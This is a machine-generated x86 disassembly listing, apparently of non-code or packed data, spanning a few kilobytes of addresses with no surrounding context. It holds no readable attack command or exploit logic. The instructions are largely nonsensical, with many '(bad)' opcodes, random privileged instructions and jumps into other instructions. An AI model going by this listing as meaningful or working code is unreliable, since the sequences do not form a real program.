  419e07:	lea    ebx,[ebp+0x4f]
  419e0a:	loope  0x419dbf
  419e0c:	repnz leave 
  419e0e:	or     ecx,DWORD PTR [edx+0x150ee532]
  419e14:	inc    ecx
  419e15:	and    DWORD PTR [esi+0x443c5c0f],eax
  419e1b:	jmp    0x419df1
  419e1d:	sbb    eax,0x8d4c6577
  419e22:	scas   al,BYTE PTR es:[edi]
  419e23:	stos   BYTE PTR es:[edi],al
  419e24:	stos   BYTE PTR es:[edi],al
  419e25:	out    0x60,eax
  419e27:	fcomp  QWORD PTR [ecx]
  419e29:	out    0xef,al
  419e2b:	bound  ebp,QWORD PTR [esi+ecx*1+0x2b65926d]
  419e32:	jns    0x419dc4
  419e34:	mov    edi,0x5eb94e63
  419e39:	(bad)  
  419e3b:	xor    DWORD PTR [ebx-0x7839e863],0xffffffe6
  419e42:	adc    DWORD PTR [ebx],esp
  419e44:	mov    es,WORD PTR [eax+0x3141a7d2]
  419e4a:	ins    BYTE PTR es:[edi],dx
  419e4b:	and    eax,0x318633c0
  419e50:	sub    ah,BYTE PTR [esi]
  419e52:	hlt    
  419e53:	mov    ch,dl
  419e55:	xor    al,0xc4
  419e57:	push   esi
  419e58:	loopne 0x419ddb
  419e5a:	fidiv  DWORD PTR [edi+0x60]
  419e5d:	bound  ecx,QWORD PTR [ecx]
  419e5f:	dec    ebp
  419e60:	dec    eax
  419e61:	adc    ecx,DWORD PTR [edx-0x68]
  419e64:	jb     0x419de8
  419e66:	or     eax,0x374b7535
  419e6b:	outs   dx,DWORD PTR ds:[esi]
  419e6c:	mov    edx,0x22439315
  419e71:	dec    eax
  419e72:	jbe    0x419e84
  419e74:	scas   al,BYTE PTR es:[edi]
  419e75:	pop    ss
  419e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e77:	xchg   esi,eax
  419e78:	dec    ebx
  419e79:	popa   
  419e7a:	(bad)  
  419e7b:	jnp    0x419e08
  419e7d:	add    BYTE PTR [ebx+0x5d],bh
  419e80:	or     dl,BYTE PTR [ecx+0x63]
  419e83:	push   esi
  419e84:	mov    dh,0xbe
  419e86:	pop    ebp
  419e87:	mov    ah,0x94
  419e89:	and    DWORD PTR [edx-0xf],ebx
  419e8c:	or     al,0xf3
  419e8e:	add    eax,0x45d2e78a
  419e93:	mov    eax,ds:0xc8a6474
  419e98:	mov    BYTE PTR [ecx+0x688b8f66],cl
  419e9e:	xor    DWORD PTR [eax-0x35],edx
  419ea1:	es mov edx,0x929c5f80
  419ea7:	sub    ebp,esi
  419ea9:	int3   
  419eaa:	mul    BYTE PTR [esi-0x77]
  419ead:	out    0x3d,al
  419eaf:	jne    0x419f2e
  419eb1:	sysexit 
  419eb3:	add    al,0xcc
  419eb5:	push   0xd
  419eb7:	xor    al,0xfe
  419eb9:	(bad)  
  419eba:	push   cs
  419ebb:	addr16 push ebp
  419ebd:	fsubr  DWORD PTR [ebx+ebx*2]
  419ec0:	push   eax
  419ec1:	test   DWORD PTR fs:[ebp+0x3863589f],ebx
  419ec8:	mov    ds:0x1e4557ec,eax
  419ecd:	out    dx,al
  419ece:	mov    bl,0x9e
  419ed0:	retf   
  419ed1:	cmp    DWORD PTR [esi],0x6b
  419ed4:	mov    dl,0x86
  419ed6:	sub    BYTE PTR [ecx],al
  419ed8:	push   es
  419ed9:	push   es
  419eda:	stc    
  419edb:	or     esi,edi
  419edd:	shr    DWORD PTR [edx],cl
  419edf:	pop    ecx
  419ee0:	iret   
  419ee1:	mov    ds:0xf46b6a6b,eax
  419ee6:	int3   
  419ee7:	dec    ebp
  419ee8:	dec    eax
  419ee9:	mov    DWORD PTR [esi],0x7cbd4b25
  419eef:	or     DWORD PTR ss:[esi+0x26],ebp
  419ef3:	int    0xfc
  419ef5:	(bad)  
  419ef6:	mov    edx,0x1baf2e43
  419efb:	loopne 0x419f00
  419efd:	push   ecx
  419efe:	or     DWORD PTR [ebx+ebp*1+0x9724407],ecx
  419f05:	fild   DWORD PTR [esi+0x3fb9ed02]
  419f0b:	mov    BYTE PTR [esi+0x43],0x27
  419f0f:	aas    
  419f10:	int3   
  419f11:	clc    
  419f12:	jnp    0x419ed8
  419f14:	enter  0x9829,0xea
  419f18:	retf   
  419f19:	dec    ebp
  419f1a:	push   ecx
  419f1b:	add    al,0xbc
  419f1d:	mov    bh,0x8e
  419f1f:	rcr    bl,0xae
  419f22:	jp     0x419f85
  419f24:	scas   al,BYTE PTR es:[edi]
  419f25:	sub    DWORD PTR [esi-0x4a],edx
  419f28:	mov    fs,WORD PTR [eax]
  419f2a:	into   
  419f2b:	mov    eax,0x8c8b25f2
  419f30:	clc    
  419f31:	int    0x30
  419f33:	mov    ebp,0xd69b71ed
  419f38:	jns    0x419ec1
  419f3a:	xchg   esp,eax
  419f3b:	mov    ah,0xe1
  419f3d:	push   eax
  419f3e:	cmp    DWORD PTR [ecx-0x5d],esi
  419f41:	xlat   BYTE PTR ds:[ebx]
  419f42:	stc    
  419f43:	shl    DWORD PTR [eax-0x53157383],1
  419f49:	les    ebp,FWORD PTR [ebx+ebx*2]
  419f4c:	lock test al,0x95
  419f4f:	sbb    BYTE PTR [ebp-0x4e244916],ah
  419f55:	jo     0x419f69
  419f57:	cmp    eax,0xaaa0fa2f
  419f5c:	xchg   cl,al
  419f5e:	xor    BYTE PTR [esi+0x3bcf6892],al
  419f64:	test   BYTE PTR [edi-0x2acd78c],dl
  419f6a:	pop    ds
  419f6b:	scas   al,BYTE PTR es:[edi]
  419f6c:	loope  0x419efb
  419f6e:	mov    ebx,0xf607ad43
  419f73:	int    0x69
  419f75:	ret    
  419f76:	in     al,dx
  419f77:	xor    eax,0x5de4e1d6
  419f7c:	push   edi
  419f7d:	xor    DWORD PTR [edi],eax
  419f7f:	mov    WORD PTR [bp-0x49],fs
  419f83:	jl     0x419f86
  419f85:	mov    ds:0x6de8a75a,al
  419f8a:	mov    ebp,0x611872d5
  419f8f:	xchg   edi,eax
  419f90:	push   DWORD PTR [edi+eax*4-0x1e5182e8]
  419f97:	push   cs
  419f98:	dec    esp
  419f99:	xor    DWORD PTR [edx-0x36],ebp
  419f9c:	cmp    al,0x17
  419f9e:	sub    eax,0x7985c23
  419fa3:	adc    ah,BYTE PTR [ecx-0xb]
  419fa6:	sub    ch,BYTE PTR ds:0x74a1f0bb
  419fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fad:	hlt    
  419fae:	dec    esp
  419faf:	jg     0x419f79
  419fb1:	fcom   DWORD PTR [edi]
  419fb3:	mov    BYTE PTR [edx+0x72],cl
  419fb6:	cmc    
  419fb7:	adc    DWORD PTR [esi+edi*2-0x68],ebx
  419fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fbc:	and    al,0x56
  419fbe:	xor    BYTE PTR ds:0x7cc1b5ff,al
  419fc4:	ds scas al,BYTE PTR es:[edi]
  419fc6:	sti    
  419fc7:	pop    ss
  419fc8:	sbb    cl,BYTE PTR [ecx]
  419fca:	int3   
  419fcb:	dec    edx
  419fcc:	daa    
  419fcd:	gs sahf 
  419fcf:	dec    ebx
  419fd0:	adc    dl,BYTE PTR [edi+0x61]
  419fd3:	call   0x19671c09
  419fd8:	and    dl,BYTE PTR [ebp+0x78]
  419fdb:	das    
  419fdc:	jae    0x419ff7
  419fde:	push   eax
  419fdf:	mov    al,0x25
  419fe1:	or     BYTE PTR [ebx-0xe],dl
  419fe4:	scas   al,BYTE PTR es:[edi]
  419fe5:	pop    edi
  419fe6:	xchg   edx,eax
  419fe7:	dec    edi
  419fe8:	mov    bl,0x3d
  419fea:	push   ds
  419feb:	enter  0x34fa,0xee
  419fef:	je     0x419f92
  419ff1:	inc    ebx
  419ff2:	imul   edx,DWORD PTR [ebx+0x66],0xffffffeb
  419ff6:	mov    edx,0x2605666b
  419ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ffc:	repz push esi
  419ffe:	dec    eax
  419fff:	popa   
  41a000:	jae    0x419fa3
  41a002:	jle    0x419fc7
  41a004:	jl     0x419fe2
  41a006:	test   eax,0x6bddb611
  41a00b:	repz lahf 
  41a00d:	popf   
  41a00e:	pushf  
  41a00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a010:	rol    dl,0x4d
  41a013:	or     BYTE PTR [edx+0x47],cl
  41a016:	xor    ebp,DWORD PTR [esi-0x7f825fd6]
  41a01c:	enter  0x51a8,0x9
  41a020:	inc    ebp
  41a021:	pop    ebx
  41a022:	ret    
  41a023:	dec    ebp
  41a024:	call   0xce9:0x9b1bab91
  41a02b:	pushf  
  41a02c:	enter  0x1a56,0x96
  41a030:	mov    ecx,0xe57bd929
  41a035:	mov    ecx,0xab020182
  41a03a:	nop
  41a03b:	stc    
  41a03c:	pop    edx
  41a03d:	push   cs
  41a03e:	add    eax,0x9f2fe3ee
  41a043:	mov    DWORD PTR [ebx+0x79],edx
  41a046:	jb     0x419fe2
  41a048:	fmulp  st(5),st
  41a04a:	or     edi,DWORD PTR [edx-0x50a78325]
  41a050:	pusha  
  41a051:	xor    al,0xb0
  41a053:	push   ebx
  41a054:	dec    edx
  41a055:	push   edx
  41a056:	or     edx,ecx
  41a058:	je     0x41a017
  41a05a:	jl     0x41a039
  41a05c:	popa   
  41a05d:	retf   
  41a05e:	push   0xce127fc4
  41a063:	call   0x2681:0x6ad85fad
  41a06a:	enter  0x9163,0x52
  41a06e:	mov    ?,WORD PTR ds:0xb627c83f
  41a074:	mov    edx,DWORD PTR [eax-0x73aa40ae]
  41a07a:	(bad)  
  41a07b:	cs mov dl,0x1d
  41a07e:	xchg   BYTE PTR [eax],bl
  41a080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a081:	jb     0x41a02b
  41a083:	xchg   ebp,eax
  41a084:	sub    al,cl
  41a086:	xchg   ah,bh
  41a088:	or     bl,BYTE PTR [edi+eax*2+0x43]
  41a08c:	jb     0x41a065
  41a08e:	pop    ss
  41a08f:	emms   
  41a091:	xor    bl,al
  41a093:	(bad)  
  41a094:	push   ss
  41a095:	dec    edi
  41a096:	mov    ds:0x7bb8a5d9,al
  41a09b:	and    BYTE PTR [ecx],dl
  41a09d:	into   
  41a09e:	mov    cl,0xae
  41a0a0:	push   edi
  41a0a1:	ds or  eax,edi
  41a0a4:	add    bh,dl
  41a0a6:	jns    0x41a11d
  41a0a8:	cld    
  41a0a9:	inc    eax
  41a0aa:	sub    al,0xd3
  41a0ac:	jne    0x41a043
  41a0ae:	sar    BYTE PTR fs:[edx-0x7d],1
  41a0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b3:	aam    0xf1
  41a0b5:	mov    dl,0x89
  41a0b7:	stos   DWORD PTR es:[edi],eax
  41a0b8:	out    dx,al
  41a0b9:	push   ebp
  41a0ba:	xchg   ebx,eax
  41a0bb:	test   eax,0x28d26486
  41a0c0:	mov    ds:0x4ffec4b4,al
  41a0c5:	in     al,0xbb
  41a0c7:	arpl   di,di
  41a0c9:	shl    DWORD PTR [ecx+0x3d0eac8f],1
  41a0cf:	mov    cl,0x61
  41a0d1:	pusha  
  41a0d2:	push   esp
  41a0d3:	shl    BYTE PTR [eax+eiz*8],1
  41a0d6:	(bad)  
  41a0d7:	jecxz  0x41a07b
  41a0d9:	xchg   ebp,eax
  41a0da:	push   ebp
  41a0db:	addr16 mov cl,0x52
  41a0de:	in     eax,dx
  41a0df:	stc    
  41a0e0:	ret    0x5d18
  41a0e3:	sahf   
  41a0e4:	out    dx,al
  41a0e5:	inc    ebx
  41a0e6:	(bad)  
  41a0e7:	ds pop esi
  41a0e9:	inc    edi
  41a0ea:	mov    esi,0xed25858b
  41a0ef:	mov    dl,0xd4
  41a0f1:	out    dx,eax
  41a0f2:	lock or al,0xd4
  41a0f5:	mov    DWORD PTR [edx],edi
  41a0f7:	ds cmp ch,al
  41a0fa:	mov    WORD PTR [edx-0x16c553fd],?
  41a100:	outs   dx,DWORD PTR ds:[esi]
  41a101:	cmp    esi,ebp
  41a103:	jbe    0x41a08c
  41a105:	or     BYTE PTR [ebp+0x68178355],0xdc
  41a10c:	ret    0x81c7
  41a10f:	jmp    0x41a172
  41a111:	jns    0x41a16b
  41a113:	push   eax
  41a114:	into   
  41a115:	add    ch,BYTE PTR [esi+eiz*2+0x55]
  41a119:	and    edx,DWORD PTR [edi+0x2c]
  41a11c:	xor    al,0x8b
  41a11e:	sbb    eax,0x32a129b4
  41a123:	call   0x161b:0x215492e6
  41a12a:	(bad)  
  41a12b:	xor    dl,BYTE PTR [edx-0x6b750fd7]
  41a131:	into   
  41a132:	mov    ecx,DWORD PTR [eax+0xc]
  41a135:	adc    dl,BYTE PTR [ebx-0x32df13e3]
  41a13b:	ja     0x41a0c5
  41a13d:	daa    
  41a13e:	pop    esp
  41a13f:	mov    cl,BYTE PTR [esi*1+0x264ea1ab]
  41a146:	or     esi,DWORD PTR [ebx-0x444df41e]
  41a14c:	out    0xf,al
  41a14e:	add    al,0xfb
  41a150:	mov    ebp,0x1482acff
  41a155:	das    
  41a156:	dec    ebx
  41a157:	pop    esp
  41a158:	jo     0x41a15c
  41a15a:	mov    eax,0xd9fd690b
  41a15f:	(bad)  
  41a160:	sbb    ah,dl
  41a162:	mov    esp,0xe1a9b869
  41a167:	cmp    al,0xd7
  41a169:	inc    ebp
  41a16a:	gs push ebp
  41a16c:	das    
  41a16d:	rcr    DWORD PTR [ebp+ecx*1-0x63],cl
  41a171:	js     0x41a18c
  41a173:	mov    ebx,0xa219df5f
  41a178:	inc    ecx
  41a179:	inc    edi
  41a17a:	sub    bh,BYTE PTR [edx+eax*1+0x6b]
  41a17e:	xchg   BYTE PTR [ebp+0x53],dh
  41a181:	js     0x41a174
  41a183:	cmc    
  41a184:	stos   DWORD PTR es:[edi],eax
  41a185:	pop    ecx
  41a186:	cwde   
  41a187:	aas    
  41a188:	jmp    0x41a15f
  41a18a:	pusha  
  41a18b:	jno    0x41a155
  41a18d:	cld    
  41a18e:	dec    ecx
  41a18f:	loopne 0x41a146
  41a191:	retf   0x6350
  41a194:	adc    al,0x62
  41a196:	push   ebp
  41a197:	or     al,0xfa
  41a199:	pusha  
  41a19a:	mov    BYTE PTR [edi+ebx*1+0x6f15b94],dl
  41a1a1:	out    dx,al
  41a1a2:	ins    DWORD PTR es:[edi],dx
  41a1a3:	pop    ebp
  41a1a4:	xor    edi,edi
  41a1a6:	cdq    
  41a1a7:	jno    0x41a219
  41a1a9:	jmp    0x8f4a:0xb79e1c72
  41a1b0:	inc    ecx
  41a1b1:	sub    DWORD PTR [ebp-0x4edf5946],0x897c6fb5
  41a1bb:	mov    esi,0x75ab5d16
  41a1c0:	fidivr DWORD PTR [eax+0x6d4bc096]
  41a1c6:	mov    ds:0x76cadd7e,eax
  41a1cb:	mov    ah,0xe
  41a1cd:	pop    esp
  41a1ce:	call   0x970be723
  41a1d3:	pop    ss
  41a1d4:	and    bl,BYTE PTR [eax+eiz*4-0x4d]
  41a1d8:	enter  0xdb7f,0xb6
  41a1dc:	retf   0xc90e
  41a1df:	xor    eax,0xe7c912e3
  41a1e4:	loop   0x41a1d2
  41a1e6:	pop    eax
  41a1e7:	inc    eax
  41a1e8:	pop    ds
  41a1e9:	ret    0x936c
  41a1ec:	sahf   
  41a1ed:	xor    dh,BYTE PTR [esi+ebp*2]
  41a1f0:	cmc    
  41a1f1:	add    ch,BYTE PTR [ebx+0x714b6344]
  41a1f7:	cdq    
  41a1f8:	jmp    0xfceb:0x7138d77b
  41a1ff:	call   0xa0e319b2
  41a204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a205:	das    
  41a206:	jge    0x41a1b7
  41a208:	xchg   edx,eax
  41a209:	or     DWORD PTR [edi],ecx
  41a20b:	mov    ebp,0xac5804b8
  41a210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a211:	sub    ecx,ecx
  41a213:	inc    ebp
  41a214:	push   ss
  41a215:	sub    BYTE PTR [ebp-0x4e],bh
  41a218:	rol    cl,0x9f
  41a21b:	(bad)  
  41a21c:	mov    edx,0x55932120
  41a221:	pop    es
  41a222:	aas    
  41a223:	addr16 cmp eax,0x4cb33171
  41a229:	pushf  
  41a22a:	retf   
  41a22b:	pop    edx
  41a22c:	inc    esp
  41a22d:	push   cs
  41a22e:	jns    0x41a2a4
  41a230:	inc    edx
  41a231:	inc    edx
  41a232:	dec    edx
  41a233:	xchg   edi,esp
  41a235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a236:	mov    edx,0x3e0e0e47
  41a23b:	xor    bh,bh
  41a23d:	mov    ah,0x79
  41a23f:	jo     0x41a22a
  41a241:	retf   
  41a242:	scas   al,BYTE PTR es:[edi]
  41a243:	xor    edx,eax
  41a245:	stos   DWORD PTR es:[edi],eax
  41a246:	sti    
  41a247:	jb     0x41a282
  41a249:	ins    DWORD PTR es:[edi],dx
  41a24a:	inc    esp
  41a24b:	cmp    bl,BYTE PTR [ebp-0x5c3295f0]
  41a251:	cmp    al,BYTE PTR [edx-0x5ccf5297]
  41a257:	or     DWORD PTR [eax],ecx
  41a259:	(bad)  
  41a25a:	fist   DWORD PTR [esp+edi*2-0x43c1ec43]
  41a261:	rol    DWORD PTR [ebp+0x2c],1
  41a264:	mov    ebx,0x1fa09ef
  41a269:	out    0x6,eax
  41a26b:	in     eax,dx
  41a26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a26d:	lods   al,BYTE PTR ds:[esi]
  41a26e:	icebp  
  41a26f:	loope  0x41a2b1
  41a271:	lods   al,BYTE PTR ds:[esi]
  41a272:	in     eax,0xe6
  41a274:	(bad)  
  41a275:	cmp    DWORD PTR [eax],ebp
  41a277:	(bad)  
  41a279:	jns    0x41a28c
  41a27b:	jb     0x41a27a
  41a27d:	pop    eax
  41a27e:	and    ebx,DWORD PTR [edx-0x539eeda9]
  41a284:	and    DWORD PTR [edi],eax
  41a286:	mov    al,BYTE PTR [eax+0x26]
  41a289:	arpl   WORD PTR [ebx-0x64042280],dx
  41a28f:	cmp    DWORD PTR [esp+ecx*2-0x63],0x9aedb9d4
  41a297:	mov    ecx,0x58294e22
  41a29c:	mov    ebx,0x93d71152
  41a2a1:	cpuid  
  41a2a3:	sub    DWORD PTR [esi+0x38],edx
  41a2a6:	retf   0xcfec
  41a2a9:	nop
  41a2aa:	call   0xab20:0xeecbfd01
  41a2b1:	pop    esp
  41a2b2:	mov    edx,0x763f6d83
  41a2b7:	mov    esp,0xcb932d25
  41a2bc:	adc    eax,0x7b0f9b16
  41a2c1:	ja     0x41a339
  41a2c3:	mov    edx,0xd72815b8
  41a2c8:	push   ecx
  41a2c9:	and    DWORD PTR [ecx+0x7c],0x5eec40a4
  41a2d0:	fwait
  41a2d1:	mov    eax,ds:0xe500d056
  41a2d6:	lods   al,BYTE PTR ds:[esi]
  41a2d7:	cmp    al,0x9c
  41a2d9:	cmp    eax,0x2473ae07
  41a2de:	dec    esi
  41a2df:	rol    BYTE PTR [edi-0x2937ebe7],1
  41a2e5:	or     ah,al
  41a2e7:	mov    dh,ch
  41a2e9:	mov    ebp,0x1c4e2518
  41a2ee:	test   al,0xac
  41a2f0:	test   eax,0xaa3eb537
  41a2f5:	adc    dl,dl
  41a2f7:	xchg   edx,ecx
  41a2f9:	(bad)  [edi-0x650b1fda]
  41a2ff:	jbe    0x41a2ef
  41a301:	lahf   
  41a302:	xor    cl,cl
  41a304:	iret   
  41a305:	int    0xac
  41a307:	hlt    
  41a308:	inc    esi
  41a309:	dec    edi
  41a30a:	sub    bl,al
  41a30c:	jg     0x41a2a5
  41a30e:	xchg   ah,bh
  41a310:	dec    eax
  41a311:	ins    DWORD PTR es:[edi],dx
  41a312:	mov    ecx,DWORD PTR [eax-0x415e4f7a]
  41a318:	shr    DWORD PTR [edi],0x99
  41a31b:	push   ds
  41a31c:	jae    0x41a2c0
  41a31e:	mov    ds:0x31d43a87,eax
  41a323:	ins    DWORD PTR es:[edi],dx
  41a324:	mov    bh,0x39
  41a326:	cmp    al,0xa4
  41a328:	stos   BYTE PTR es:[edi],al
  41a329:	in     eax,0xed
  41a32b:	mov    esi,0x2d087384
  41a330:	call   0xbd723ff3
  41a335:	(bad)  
  41a336:	cld    
  41a337:	call   FWORD PTR [esi-0x73f01495]
  41a33d:	shl    edx,1
  41a33f:	and    ah,BYTE PTR ds:0xbb628266
  41a345:	test   BYTE PTR [esi-0x416aef0b],cl
  41a34b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a34d:	xchg   esp,eax
  41a34e:	or     DWORD PTR [ebx],esi
  41a350:	aaa    
  41a351:	pop    es
  41a352:	cmp    al,0xa6
  41a354:	inc    ebp
  41a355:	inc    edx
  41a356:	fild   QWORD PTR [esi-0x5fb949a1]
  41a35c:	cmp    al,0x28
  41a35e:	adc    eax,0xb3513e2e
  41a363:	xor    eax,0x3b0c4a84
  41a368:	fild   QWORD PTR [ebp+0x256f5731]
  41a36e:	push   ds
  41a36f:	inc    esi
  41a370:	mov    esi,0x52cb963e
  41a375:	pusha  
  41a376:	mov    dh,0x53
  41a378:	repz xchg esp,eax
  41a37a:	and    eax,0x2a4ebb25
  41a37f:	scas   eax,DWORD PTR es:[edi]
  41a380:	xor    BYTE PTR ds:0x9061dd88,0xc7
  41a387:	rcr    ch,cl
  41a389:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41a38b:	inc    ecx
  41a38c:	mov    edi,0x32020c69
  41a391:	dec    ebx
  41a392:	mov    DWORD PTR [edx],esp
  41a394:	push   ebp
  41a395:	sti    
  41a396:	out    0x9a,eax
  41a398:	pop    ebx
  41a399:	pop    eax
  41a39a:	jne    0x41a399
  41a39c:	cwde   
  41a39d:	cmp    eax,0x462e986d
  41a3a2:	xchg   edx,eax
  41a3a3:	(bad)  
  41a3a4:	adc    DWORD PTR [esi-0x1a2fe771],esp
  41a3aa:	mov    eax,ds:0x5371fe22
  41a3af:	mov    al,0x94
  41a3b1:	xor    eax,0x38ddc1af
  41a3b6:	jle    0x41a34e
  41a3b8:	lea    ebx,ds:0x1e2d75a3
  41a3be:	jg     0x41a3b5
  41a3c0:	daa    
  41a3c1:	and    ebp,DWORD PTR [ebx-0x5b]
  41a3c4:	test   eax,0x16d62e94
  41a3c9:	or     ah,BYTE PTR [ecx+0x45ab7f3e]
  41a3cf:	cmp    edx,0x8490d32f
  41a3d5:	mov    ds:0x5b63e3b7,al
  41a3da:	icebp  
  41a3db:	add    al,0x79
  41a3dd:	mov    fs,WORD PTR [edi+0x1b00140e]
  41a3e3:	adc    DWORD PTR ds:[edx-0x3a529e8d],esi
  41a3ea:	in     al,dx
  41a3eb:	xchg   esp,eax
  41a3ec:	mov    dh,0x54
  41a3ee:	rcr    al,1
  41a3f0:	and    eax,0x637d5907
  41a3f5:	push   0x8e3df2a5
  41a3fa:	xchg   DWORD PTR [esi+0x5e9a0166],ebx
  41a400:	sub    edx,ebx
  41a402:	mov    cl,0x7b
  41a404:	rol    ah,0x45
  41a407:	pop    edx
  41a408:	cmp    al,0xc9
  41a40a:	dec    ecx
  41a40b:	add    ecx,esp
  41a40d:	int    0x30
  41a40f:	sub    BYTE PTR [eax],bl
  41a411:	xor    al,0x93
  41a413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a414:	in     al,dx
  41a415:	sbb    DWORD PTR [ebx-0x44],esp
  41a418:	leave  
  41a419:	cli    
  41a41a:	add    BYTE PTR [edx],bh
  41a41c:	leave  
  41a41d:	icebp  
  41a41e:	int3   
  41a41f:	rcr    BYTE PTR [eax],1
  41a421:	and    dh,0x40
  41a424:	sbb    al,0x6a
  41a426:	mov    eax,0xd50097eb
  41a42b:	jge    0x41a47f
  41a42d:	cdq    
  41a42e:	sti    
  41a42f:	xchg   ecx,eax
  41a430:	pop    esi
  41a431:	add    ebp,0x11e11c1d
  41a437:	sbb    DWORD PTR [edi],eax
  41a439:	jo     0x41a46e
  41a43b:	test   BYTE PTR [edi-0x43a8f620],ah
  41a441:	test   BYTE PTR [eax],dl
  41a443:	jge    0x41a40a
  41a445:	xchg   ebx,eax
  41a446:	lea    edx,[edx]
  41a448:	push   edx
  41a449:	ret    
  41a44a:	in     ax,dx
  41a44c:	inc    ecx
  41a44d:	cmp    bl,BYTE PTR [ecx-0x68]
  41a450:	call   0x599:0xa586fcb1
  41a457:	sub    edi,DWORD PTR [esi+edi*1-0x8472e6c]
  41a45e:	mov    bh,0xe9
  41a460:	(bad)  
  41a461:	out    dx,eax
  41a462:	sub    eax,0x47050a07
  41a467:	sub    dl,BYTE PTR [ecx-0xd]
  41a46a:	jno    0x41a4c9
  41a46c:	or     al,0x72
  41a46e:	jl     0x41a491
  41a470:	jae    0x41a481
  41a472:	dec    edx
  41a473:	(bad)  
  41a475:	aaa    
  41a476:	pop    eax
  41a477:	cdq    
  41a478:	(bad)  
  41a479:	dec    edi
  41a47a:	lahf   
  41a47b:	inc    ebp
  41a47c:	pop    esp
  41a47d:	aas    
  41a47e:	pop    edx
  41a47f:	inc    ecx
  41a480:	pop    eax
  41a481:	aam    0x5d
  41a483:	test   DWORD PTR [ecx+ebx*2+0x11],0x482e9dd0
  41a48b:	dec    edx
  41a48c:	fcmovnbe st,st(3)
  41a48e:	fild   DWORD PTR [esi-0x76]
  41a491:	xor    eax,0x5e4aab81
  41a496:	rcr    ebp,cl
  41a498:	inc    ebp
  41a499:	xchg   esi,eax
  41a49a:	sbb    DWORD PTR [esi+0x1006b150],ebp
  41a4a0:	shl    BYTE PTR [edi-0x75930318],1
  41a4a6:	shr    bl,0xca
  41a4a9:	std    
  41a4aa:	fisub  DWORD PTR [esi+ebp*1-0x5e4d43de]
  41a4b1:	lods   al,BYTE PTR ds:[esi]
  41a4b2:	test   cl,bh
  41a4b4:	cmp    ah,BYTE PTR ds:0x52b836a1
  41a4ba:	push   0x43
  41a4bc:	retf   0xcb46
  41a4bf:	test   eax,0xd56ba43b
  41a4c4:	adc    ah,bh
  41a4c6:	mov    ds:0x5e9c2733,eax
  41a4cb:	or     eax,0x85c9bcec
  41a4d0:	pop    esp
  41a4d1:	mov    dh,0x18
  41a4d3:	popf   
  41a4d4:	mov    al,ds:0x6e1906ac
  41a4d9:	or     al,0xbf
  41a4db:	ins    BYTE PTR es:[edi],dx
  41a4dc:	and    DWORD PTR [esi],ecx
  41a4de:	push   ds
  41a4df:	pop    esp
  41a4e0:	jmp    0xd98d:0xdc4936c3
  41a4e7:	into   
  41a4e8:	sbb    bl,BYTE PTR [edx+0x73]
  41a4eb:	inc    esi
  41a4ec:	loope  0x41a517
  41a4ee:	push   edx
  41a4ef:	arpl   ax,dx
  41a4f1:	std    
  41a4f2:	in     al,0x65
  41a4f4:	inc    eax
  41a4f5:	cmc    
  41a4f6:	dec    eax
  41a4f7:	int3   
  41a4f8:	jp     0x41a56d
  41a4fa:	stos   DWORD PTR es:[edi],eax
  41a4fb:	push   ebp
  41a4fc:	inc    ebx
  41a4fd:	pop    ds
  41a4fe:	(bad)  
  41a4ff:	jmp    0x874a238c
  41a504:	adc    DWORD PTR [eax-0x6318da33],edi
  41a50a:	sbb    eax,0x6fcc78
  41a50f:	and    eax,0x533e00f6
  41a514:	xchg   ebx,eax
  41a516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a517:	outs   dx,BYTE PTR ds:[esi]
  41a518:	dec    esp
  41a519:	pop    es
  41a51a:	inc    esi
  41a51b:	sbb    ch,bl
  41a51d:	jns    0x41a564
  41a51f:	xchg   esi,eax
  41a520:	mov    eax,0x7570eae8
  41a525:	mov    ebx,0xd5b6f3e6
  41a52a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a52b:	stos   BYTE PTR es:[edi],al
  41a52c:	xchg   ebx,eax
  41a52d:	push   edx
  41a52e:	(bad)  
  41a52f:	jmp    0xe1c7:0x94c8a513
  41a536:	fimul  DWORD PTR [edi]
  41a538:	mov    al,0x9c
  41a53a:	sbb    ebx,ebx
  41a53c:	inc    BYTE PTR [edi-0x7c]
  41a53f:	mov    bl,0x73
  41a541:	mov    cl,0x31
  41a543:	dec    edx
  41a544:	neg    BYTE PTR [edi+eax*2]
  41a547:	sbb    bh,0xfb
  41a54a:	fdiv   DWORD PTR [edx+esi*1+0x63070312]
  41a551:	js     0x41a575
  41a553:	mov    esp,0xfa917328
  41a558:	xor    al,0xb
  41a55a:	nop
  41a55b:	pushf  
  41a55c:	cld    
  41a55d:	cmp    dl,BYTE PTR [esi]
  41a55f:	jle    0x41a567
  41a561:	loope  0x41a571
  41a563:	dec    ebp
  41a564:	pushf  
  41a565:	pop    edx
  41a566:	stc    
  41a567:	jp     0x41a556
  41a569:	push   edx
  41a56a:	push   ebx
  41a56b:	adc    al,0x57
  41a56d:	adc    cl,BYTE PTR [eax+ebx*8-0x66b86b64]
  41a574:	repz pop ebp
  41a576:	xchg   ebx,eax
  41a577:	rcl    BYTE PTR [eax+0x76654ad],1
  41a57d:	mov    edi,0x287e0922
  41a582:	stos   BYTE PTR es:[edi],al
  41a583:	dec    esi
  41a584:	imul   ebp,DWORD PTR [ebx-0x7da86ca],0xa8b8fe7c
  41a58e:	jne    0x41a5dc
  41a590:	aas    
  41a591:	mov    dh,0x57
  41a593:	mov    eax,edi
  41a595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a596:	dec    ebp
  41a597:	mov    eax,ds:0x4994446e
  41a59c:	js     0x41a601
  41a59e:	cld    
  41a59f:	mov    eax,ds:0xbc6300f
  41a5a4:	inc    edi
  41a5a5:	sub    ebx,ebp
  41a5a7:	adc    DWORD PTR [ebp-0x17de924f],ebx
